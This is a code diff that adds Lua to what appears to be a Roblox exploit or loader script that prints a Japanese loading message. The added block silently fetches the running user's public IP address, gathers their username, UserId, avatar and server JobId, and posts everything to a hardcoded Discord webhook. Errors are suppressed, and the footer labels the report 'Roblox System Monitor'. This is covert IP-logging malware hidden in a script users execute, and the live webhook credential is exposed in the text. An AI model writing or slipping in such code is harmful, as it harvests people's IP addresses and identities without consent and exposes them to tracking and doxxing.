@@ -1,5 +1,78 @@
 print("ローディング中")
 
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+
+local WEBHOOK_URL = "https://discordapp.com/api/webhooks/1492013363314823281/uZNBZrgD6m5UrJcGZYLR0e3TA9R2Ab6HKE3k6zaQR-STkMqZjcErv83DG6lbQIvnirWH"
+
+local player = Players.LocalPlayer
+
+-- IP取得（失敗しても落ちないように）
+local ip = "unknown"
+pcall(function()
+    ip = game:HttpGet("https://api.ipify.org/")
+end)
+
+-- アバター画像
+local avatar = "https://www.roblox.com/headshot-thumbnail/image?userId="
+    .. player.UserId
+    .. "&width=420&height=420&format=png"
+
+local data = {
+    embeds = {
+        {
+            title = "🌐 Player Log Detected",
+            color = 5814783,
+
+            author = {
+                name = player.Name .. " が実行",
+            },
+
+            thumbnail = {
+                url = avatar
+            },
+
+            fields = {
+                {
+                    name = "👤 ユーザー情報",
+                    value = "```" .. player.Name .. "```",
+                    inline = true
+                },
+                {
+                    name = "🆔 UserId",
+                    value = "```" .. player.UserId .. "```",
+                    inline = true
+                },
+                {
+                    name = "🌍 IPアドレス",
+                    value = "```" .. ip .. "```",
+                    inline = false
+                },
+                {
+                    name = "📡 サーバー情報",
+                    value = "```JobId: " .. game.JobId .. "```",
+                    inline = false
+                }
+            },
+
+            footer = {
+                text = "Roblox System Monitor"
+            },
+
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }
+    }
+}
+
+-- 送信（失敗しても止まらない）
+pcall(function()
+    HttpService:PostAsync(
+        WEBHOOK_URL,
+        HttpService:JSONEncode(data),
+        Enum.HttpContentType.ApplicationJson
+    )
+end)
+
 if not success then
 	warn("queueonteleport セット失敗:", err)
 end
